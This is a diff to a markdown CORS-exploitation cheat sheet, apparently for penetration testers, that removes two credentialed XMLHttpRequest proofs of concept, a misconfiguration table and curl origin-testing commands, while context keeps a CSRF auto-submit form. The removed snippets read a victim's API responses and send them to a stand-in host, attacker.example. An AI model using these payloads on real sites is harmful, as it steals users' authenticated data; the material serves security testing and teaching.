@@ -69,20 +69,7 @@ Server trusts `*.target.example` — exploit XSS on any subdomain, or register a
 
 ### Unescaped Dot in Regex
 
-If server validates `^api.target.example$` (unescaped dot), register `apiatarget.example`:
-
-```html
-<!-- Hosted on apiatarget.example -->
-<script>
-var req = new XMLHttpRequest();
-req.onload = function() {
-  location = 'https://attacker.example/log?data=' + encodeURIComponent(this.responseText);
-};
-req.open('GET', 'https://api.target.example/api/sensitive', true);
-req.withCredentials = true;
-req.send();
-</script>
-```
+If server validates `^api.target.example$` (unescaped dot), register `apiatarget.example`.
 
 ### Prefix/Suffix Matching Bypass
 
@@ -103,57 +90,4 @@ Simple requests (GET, POST with standard Content-Type) skip pre-flight OPTIONS c
   <input name="email" value="attacker@evil.example">
 </form>
 <script>document.forms[0].submit();</script>
-```
-
-## Full Credential Stealing PoC
-
-```html
-<!DOCTYPE html>
-<html>
-<body>
-  <h2>CORS Exploitation PoC</h2>
-  <div id="result"></div>
-  <script>
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-      if (this.readyState == 4 && this.status == 200) {
-        document.getElementById("result").innerText = this.responseText;
-        // Exfiltrate
-        var exfil = new XMLHttpRequest();
-        exfil.open("POST", "https://attacker.example/collect", true);
-        exfil.send(this.responseText);
-      }
-    };
-    xhr.open("GET", "https://target.example/api/me", true);
-    xhr.withCredentials = true;
-    xhr.send();
-  </script>
-</body>
-</html>
-```
-
-## Common CORS Misconfigurations
-
-| Misconfiguration | Risk |
-|-----------------|------|
-| `Access-Control-Allow-Origin: *` with credentials | Browser blocks entirely — response not accessible to scripts. Indicates server confusion; test for other CORS misconfigs. |
-| Origin reflection with `Allow-Credentials: true` | Full credential theft |
-| `null` origin allowed with credentials | Sandbox iframe exploitation |
-| Regex bypass (unescaped dot, prefix match) | Domain spoofing |
-| Trusting all subdomains | XSS on any subdomain = full CORS bypass |
-
-## Curl Testing Commands
-
-```bash
-# Test origin reflection
-curl -s -H "Origin: https://evil.example" https://target.example/api/ -I
-
-# Test null origin
-curl -s -H "Origin: null" https://target.example/api/ -I
-
-# Test subdomain trust
-curl -s -H "Origin: https://anything.target.example" https://target.example/api/ -I
-
-# Test prefix bypass
-curl -s -H "Origin: https://target.example.evil.example" https://target.example/api/ -I
 ```
